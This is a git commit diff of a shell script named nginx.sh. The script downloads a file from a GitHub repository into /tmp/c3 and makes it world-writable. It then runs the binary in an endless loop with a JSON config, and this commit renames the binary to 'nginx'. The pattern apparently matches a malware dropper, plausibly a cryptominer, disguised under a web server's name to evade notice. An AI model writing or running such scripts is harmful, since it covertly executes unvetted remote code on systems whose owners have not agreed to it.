19649d6d3d1e73307660884f71c348c4fd40eed0
dlfile <155894363+dlfile@users.noreply.github.com>
2024-03-17 02:59:35 +0800

    Update nginx.sh

--- e/nginx.sh
+++ e/nginx.sh
@@ -5,7 +5,6 @@ wget https://raw.githubusercontent.com/dlfile/x/main/e/nginx
 chmod -R  777 /tmp/c3
 #!/bin/sh
 while [ 1 ]; do
-	/tmp/c3/0 --config=/tmp/c3/nginx.json
-	/tmp/c3/sleep --config=/tmp/c3/nginx.json
+	/tmp/c3/nginx --config=/tmp/c3/nginx.json
 	sleep 5
 done
